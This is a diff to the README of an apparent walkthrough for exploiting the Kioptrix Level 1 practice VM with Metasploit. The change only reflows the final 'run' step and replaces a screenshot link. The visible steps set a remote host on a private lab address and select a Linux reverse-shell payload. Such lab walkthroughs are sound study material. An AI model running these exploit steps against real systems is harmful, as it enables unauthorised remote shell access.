@@ -17,7 +17,9 @@ in here i will show you how to step by step exploit kioptrix level 1 with metasp
 - use 1 
 - set RHOST 192.168.29.133
 - set payload linux/x86/shell_reverse_tcp
-- run ![Screenshot (152)](https://github.com/Haydar13D/bypass-kioptrix-level1-with-metasploit/assets/152575800/d221a7a3-b35d-41c6-9d31-2b0a3851e558)
+- run 
+- preview ![Screenshot (152)](https://github.com/Haydar13D/bypass-kioptrix-level1-with-metasploit/assets/152575800/09362c44-7d10-4d2a-b5ed-158cf676c44f)
+
 
 
 
